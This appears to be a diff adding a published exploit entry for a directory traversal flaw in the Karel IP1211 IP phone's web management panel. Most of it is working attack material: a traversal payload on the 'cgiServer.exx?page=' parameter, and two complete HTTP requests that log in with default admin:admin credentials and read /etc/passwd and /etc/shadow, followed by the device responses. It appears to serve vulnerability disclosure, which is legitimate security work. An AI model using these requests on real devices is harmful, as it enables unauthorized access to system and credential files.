@@ -1,0 +1,72 @@
+# Exploit Title: Karel IP Phone IP1211 Web Management Panel - Directory Traversal
+# Exploit Author: Berat Gokberk ISLER
+# Date: 2020-09-01
+# CVE: N/A
+# Type: Webapps
+# Vendor Homepage: https://www.karel.com.tr/urun-cozum/ip1211-ip-telefon
+# Version: IP1211
+
+Details
+
+Directory traversal vulnerability on the Karel IP1211 IP Phone Web Panel.
+Remote authenticated users (Attackers used default credentials in this
+case) to perform directory traversal, provides access to sensitive data
+under indexes using the "cgiServer.exx?page=" parameter. In this case
+sensitive files, "passwd" and "shadow" files.
+
+# Vulnerable Parameter Type: GET
+# Payload: ../../../../../../../../etc/passwd or /etc/shadow
+
+# First Request:
+
+GET /cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd
+HTTP/1.1
+Host: X.X.X.X
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0)
+Gecko/20100101 Firefox/80.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic YWRtaW46YWRtaW4= # Basic Auth --> admin:admin
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+# First Response
+
+HTTP/1.0 200 OK
+Content-Type:text/html;charset=UTF-8
+Expires:-1
+Accept-Ranges:bytes
+Server:SIPPhone
+
+root:x:0:0:Root,,,:/:/bin/sh
+admin:x:500:500:Admin,,,:/:/bin/sh
+guest:x:501:501:Guest,,,:/:/bin/sh
+
+# Second Request
+
+GET /cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/shadow
+HTTP/1.1
+Host: X.X.X.X
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0)
+Gecko/20100101 Firefox/80.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic YWRtaW46YWRtaW4= # Basic Auth --> admin:admin
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+# Second Response
+
+HTTP/1.0 200 OK
+Content-Type:text/html;charset=UTF-8
+Expires:-1
+Accept-Ranges:bytes
+Server:SIPPhone
+
+root:xxxxxxxxxxxxxxxxxxxxxxxxxxxxx:11876:0:99999:7:::
+admin:xxxxxxxxxxxxxxxxxxxxxxxxxxxxx:11876:0:99999:7:::
+guest:xxxxxxxxxxxxxxxxxxxxxxxxxxxxx:11876:0:99999:7:::
